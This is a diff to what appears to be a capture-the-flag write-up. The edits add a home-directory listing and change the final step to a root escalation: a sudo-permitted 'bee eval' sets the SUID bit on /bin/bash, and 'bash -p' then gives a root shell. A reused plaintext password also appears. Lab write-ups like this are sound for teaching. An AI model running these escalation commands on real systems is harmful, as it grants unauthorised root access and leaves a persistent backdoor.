@@ -71,7 +71,7 @@ Connecting to the database using the credentials we found, we can dump the users
 
 ```bash
 mysql -u root -pBackDropJ2024DS2024 -h
-
+```
 Searching in depth, we find a possible user mail:
 ```bash
 cat files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json
@@ -122,6 +122,11 @@ reset xterm
 export TERM=xterm
 ```
 
+We find there is a user `johncusack` in the home directory:
+```bash
+ls /home
+```
+
 We move to user su `johncusack` using the known password `BackDropJ2024DS2024`
 ```bash
 ssh johncusack
@@ -169,9 +174,11 @@ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("id");'
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-We can read the root flag:
+We can add SUID permission to `/bin/bash` as its owned by root and we can execute it as root:
 ```bash
-sudo /usr/local/bin/bee --root=/var/www/html eval 'system("cat /root/root.txt");'
+sudo /usr/local/bin/bee --root=/var/www/html eval 'system("chmod u+s /bin/bash");'
+bash -p
+cat /root/root.txt
 ```
 ```
 root flag value
